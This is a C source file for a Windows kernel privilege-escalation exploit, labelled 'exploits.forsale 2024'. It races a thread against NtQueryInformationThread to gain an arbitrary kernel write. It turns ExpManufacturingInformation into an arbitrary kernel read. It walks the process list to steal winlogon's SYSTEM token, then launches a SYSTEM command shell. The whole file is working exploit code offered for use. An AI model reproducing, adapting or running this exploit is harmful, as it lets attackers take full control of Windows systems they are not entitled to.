#include <Windows.h>
#include <stdio.h>
#include "prefetch_leak.h"
#include "ntos.h"

// variables for racing
volatile UINT64* smash_me = 0;
volatile UINT64 smash_val = 0;
BOOL ready_to_smash = 0;
HANDLE smash_thread = 0;
THREAD_TEB_INFORMATION teb_info = {0};
UINT64* write_val_ptr = 0;
UINT64 kernel_base = 0;


// racing thread
DWORD smash_func(LPVOID unused)
{
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);
    /*while (ready_to_smash == 0) {

    }*/
    while (1) {
        *smash_me ^= 0x0000000800001860; // constantly flip TebOffset and BytesToRead
    }

    return 0;
}

// 64-bit write function for kernel memory
void kernel_write64(UINT_PTR kernel_addr, UINT64 val)
{
    HANDLE thread_handle = GetCurrentThread();
    NTSTATUS status = STATUS_ACCESS_VIOLATION;
    ULONG return_len = 0;

    // set the globals
    memset(&teb_info, 0, sizeof(THREAD_TEB_INFORMATION));
    *write_val_ptr = val;
    teb_info.TebInformation = kernel_addr;

    // resume the racing thread
    ResumeThread(smash_thread);
    while (status != 0) {
        status = NtQueryInformationThread(thread_handle, ThreadTebInformation, &teb_info, sizeof(THREAD_TEB_INFORMATION), &return_len);
    }
    SuspendThread(smash_thread);
}

BYTE read_scratch[0x10020];

UINT64 ExpManufacturingInformation_OFFSET = 0;
#define PTR_OFFSET (ExpManufacturingInformation_OFFSET + 0x10)
#define SIZE_OFFSET (ExpManufacturingInformation_OFFSET + 8)


// read up to 0xFFFD bytes of kernel memory at once
void kernel_read(UINT_PTR kernel_addr, PVOID dest, USHORT size)
{
    UINT64 size_write = size;
    ULONG returned_len = 0;
    size_write <<= 0x10;
    size_write |= size;
    memset(read_scratch, 0, 0x18);
    kernel_write64(kernel_base + PTR_OFFSET, kernel_addr);
    kernel_write64(kernel_base + SIZE_OFFSET, size_write);

    NtQuerySystemInformation(0x9D, read_scratch, 0x10020, &returned_len);
    memcpy(dest, (read_scratch + 0x18), size);
}


UINT_PTR PsActiveProcessHead_OFFSET = 0;
#define SIZEOFF_EPROCESS 0xC80

int main(int argc, char** argv)
{
    printf("ntos exploit - (c) exploits.forsale 2024\n\n");
    init_find_nt_offsets("ntoskrnl.exe");
    
    // side channel to leak the kernel base
    kernel_base = leak_kernel_base_reliable();
    printf("kernel base: %p\n", kernel_base);

    if (kernel_base == 0)
    {
        printf("Failed to leak kernel base!\n");
        return 0;
    }

    // get all the offsets of globals that we'll need for the exploit
    PsActiveProcessHead_OFFSET = get_offset_PsActiveProcessHead();
    ExpManufacturingInformation_OFFSET = get_offset_ExpManufacturingInformation();
    printf("PsActiveProcessHead: %p\n", kernel_base + PsActiveProcessHead_OFFSET);
    printf("ExpManufacturingInformation: %p\n", kernel_base + ExpManufacturingInformation_OFFSET);

    // set up global state
    memset(read_scratch, 0, 0x10020);
    memset(&teb_info, 0, sizeof(THREAD_TEB_INFORMATION));
    smash_me = &teb_info.TebOffset;
    write_val_ptr = ((UINT_PTR)NtCurrentTeb() + 0x1860); // the value to write is just stored in the TEB
    *write_val_ptr = 0;


    // bring up the racing thread
    smash_thread = CreateThread(NULL, 0, smash_func, NULL, CREATE_SUSPENDED, NULL);

    BYTE output[0x8000];
    memset(output, 0, sizeof(output));
    kernel_read(kernel_base, &output, 0x100);
    if (output[0] != 'M' || output[1] != 'Z')
    {
        printf("Kernel read failed, aborting!\n");
        return 0;
    }

    // walk the process table
    UINT_PTR process_ptr = 0;
    UINT_PTR PsActiveProcessHead = kernel_base + PsActiveProcessHead_OFFSET;
    kernel_read(PsActiveProcessHead, &process_ptr, sizeof(process_ptr));
    process_ptr -= 0x448;

    // read the first process
    EPROCESS eproc;
    kernel_read(process_ptr, &eproc, sizeof(eproc));


    UINT_PTR cur_proc = 0;
    UINT_PTR system_token = 0;
    while (1) {
        UINT_PTR token_ptr = ((UINT_PTR)eproc.Token.Object) & (MAXUINT_PTR - 0xF);

        // look for winlogon to find a system token
        if (strncmp(eproc.ImageFileName, "winlogon.exe", 15) == 0) {
            system_token = token_ptr;
            printf("!!! Found system token: %p refcnt: %p\n", system_token, eproc.Token.RefCnt);
        }

        // look for our process to write the token
        if (strncmp(eproc.ImageFileName, "teb_nt_poc.exe", 15) == 0 || strncmp(eproc.ImageFileName, "cool.exe", 15) == 0) {
            printf("!!! Found our process: %p\n", cur_proc);
            if (system_token != 0)
            {
                UINT_PTR token_write_addr = cur_proc + 0x4B8;
                UINT_PTR token_write_val = system_token;
                kernel_write64(token_write_addr, token_write_val);
                printf("Swapped token!\n");
                break;
            }
        }

        cur_proc = eproc.ActiveProcessLinks.Flink;

        if (cur_proc == PsActiveProcessHead || cur_proc == 0) {
            break;
        }
        
        // read the next process
        cur_proc -= 0x448;
        kernel_read(cur_proc, &eproc, sizeof(eproc));
    }
    SuspendThread(smash_thread);

    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));


    // Start the child process. 
    CreateProcessA(NULL,   // No module name (use command line)
        "cmd",        // Command line
        NULL,           // Process handle not inheritable
        NULL,           // Thread handle not inheritable
        FALSE,          // Set handle inheritance to FALSE
        CREATE_NEW_CONSOLE,              // No creation flags
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory 
        &si,            // Pointer to STARTUPINFO structure
        &pi);           // Pointer to PROCESS_INFORMATION structur


    printf("Done!\n");

    TerminateThread(smash_thread, 0);

    return 0;
}